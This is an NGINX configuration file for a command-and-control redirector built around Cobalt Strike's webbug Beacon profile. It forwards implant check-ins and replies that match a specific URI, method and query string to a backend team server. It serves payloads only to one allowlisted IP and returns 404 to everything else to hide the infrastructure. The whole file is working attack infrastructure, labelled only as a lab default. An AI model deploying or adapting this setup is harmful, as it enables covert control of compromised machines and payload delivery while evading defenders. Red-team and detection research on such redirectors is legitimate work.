# NGINX — Smart C2 Redirector
# Filters Beacon traffic by URI, HTTP method, and query string.
# All rules defined in the primary config (no .htaccess equivalent).
#
# Profile: webbug (Cobalt Strike lab default)
#   GET  /__utm.gif   — Beacon check-in
#   POST /___utm.gif  — Beacon reply

# proxy __utm.gif (GET check-in)
location ~* /__utm.gif {
    if ($request_method !~* GET) { return 404; }
    if ($query_string !~ ^utmac=UA-2202604-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US&utmcc=__utma.+$) { return 404; }
    proxy_pass http://10.0.0.5;
    include proxy_params;
}

# proxy ___utm.gif (POST reply)
location ~* /___utm.gif {
    if ($request_method !~* POST) { return 404; }
    proxy_pass http://10.0.0.5;
    include proxy_params;
}

# Payload hosting with IP allowlist
location /payload {
    if ($remote_addr !~ ^203\.0\.113\.42$) { return 404; }
    proxy_pass http://10.0.0.5;
}

# catch-all
location / {
    return 404;
}
